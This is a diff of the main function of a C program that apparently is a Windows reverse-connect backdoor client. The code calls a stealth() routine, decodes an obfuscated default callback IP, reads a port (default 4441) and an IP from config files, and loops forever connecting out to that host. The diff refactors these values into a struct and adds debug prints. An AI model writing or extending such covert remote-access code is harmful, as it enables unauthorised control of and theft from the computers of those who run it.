@@ -2,8 +2,11 @@
 
 int main(int argc, char * argv[])
 {
-	stealth();
+	if(argc == 1)
+		stealth();
+	fileWrapper file;
 
+	//init_file(&file);
     // Create the basic variables so that you can get the port data
 	int portno;     //number of port
 	char ip[16];
@@ -13,7 +16,7 @@ int main(int argc, char * argv[])
 	FILE * fip = fopen("ip.cfg", "r");
 
 	if(fp == NULL){
-		portno = 4441;      //If no file set up default port to prevent errors
+		file.portno = 4441;      //If no file set up default port to prevent errors
 	} else {
 		int i = 0;
 		char c;
@@ -23,7 +26,7 @@ int main(int argc, char * argv[])
 		}
 		portchar[i+1] = '\0';               //Terminate string
 
-		portno = atoi(portchar);            //Set up custom port
+		file.portno = atoi(portchar);            //Set up custom port
 		fclose(fp);
 	}
 
@@ -39,7 +42,7 @@ int main(int argc, char * argv[])
 			corip[i] = decr(ch);
 		}
 
-		strcpy(ip, corip);
+		strcpy(file.ip, corip);
 		printf("%s", corip);      //If no file set up default ip to prevent errors
 	} else {
 		int i = 0;
@@ -50,13 +53,14 @@ int main(int argc, char * argv[])
 		}
 		ipchar[i] = '\0';
 
-		strcpy(ip, ipchar);
+		strcpy(file.ip, ipchar);
 
 		fclose(fip);
 	}
 
 	//Main program
 	while(1){
+		printf("loop\n");
 		//startup sa
 		WSADATA wsa;
 		if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR){
@@ -83,8 +87,9 @@ int main(int argc, char * argv[])
 
 		struct sockaddr_in client;				//server to connect information
 		client.sin_family = AF_INET;
-		client.sin_port = htons(portno);
-		client.sin_addr.s_addr = inet_addr(ip);	//this should not be hard coded.
+		client.sin_port = htons(file.portno);
+		client.sin_addr.s_addr = inet_addr(file.ip);	//this should not be hard coded.
+		printf("%s:%d", file.ip, file.portno);
 
 
 		/* create pointers so that the synthacts gets faster*/
